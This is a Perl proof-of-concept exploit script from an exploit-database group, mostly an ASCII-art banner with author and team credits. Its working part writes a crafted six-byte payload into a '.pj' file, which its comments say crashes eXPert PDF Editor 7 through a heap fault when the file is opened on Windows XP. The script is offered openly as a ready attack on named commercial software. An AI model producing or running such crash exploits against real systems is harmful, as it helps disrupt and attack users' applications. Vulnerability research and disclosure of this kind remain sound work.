#!/usr/bin/perl
sub logo {
print STDERR << "EOF";
		                                                               
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

EOF
}
# ---------
# eXPert PDF Editor 7 Professional Heap Proof Of Concept Exploit
# Author : KedAns-Dz <ked-h@hotmail.com || ked-h@exploit-id.com>
# special thanks to : Inj3ct0r Team + exploit-id Team
# ---------
# Target : eXPert PDF Editor v7.0.880.0
# Tested in Windows XP sp3 France
# Creating The Bad File .PJ And => Bo0M !
# Heap 0x0174EC24 in 'vspdfeditor140.bpl' . addres 00000008
my $PoC = "\x4b\x45\x44\x41\x4e\x53"; # NULL Heap PoC
open (FILE,">> KedAns.pj"); # Bad File Here
print FILE $PoC;
close (FILE);
# KedAns-Dz | [D] HaCkerS-StreeT-Team [Z] |!| http://twitter.com/kedans

